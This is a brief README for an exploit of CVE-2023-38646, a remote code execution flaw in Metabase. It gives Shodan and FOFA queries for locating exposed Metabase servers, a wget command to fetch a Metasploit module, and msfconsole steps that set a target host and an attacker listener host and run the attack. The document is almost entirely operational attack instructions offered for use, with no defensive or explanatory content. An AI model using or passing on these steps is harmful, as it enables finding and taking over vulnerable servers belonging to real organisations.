# CVE-2023-38646
Metabase Remote Code Execution Exploit

- Shodan dork:
```
product:"Metabase"
```
- FOFA dork:
```
app="Metabase"
```
  
## Install
```
wget https://raw.githubusercontent.com/getdrive/PoC/main/2023/Metabase/metabase_setup_token_rce.rb
```
```
cp metabase_setup_token_rce.rb /usr/share/metasploit-framework/modules/exploits/linux/http/
```

## Usage
```
msfdb reinit; msfconsole -q
```
```
msf6 > use exploit/linux/http/metabase_setup_token_rce.rb
```
```
msf6 exploit(linux/http/metabase_setup_token_rce.rb) > set rhosts target_IP
msf6 exploit(linux/http/metabase_setup_token_rce.rb) > set lhost attacker_IP
msf6 exploit(linux/http/metabase_setup_token_rce.rb) > run
```
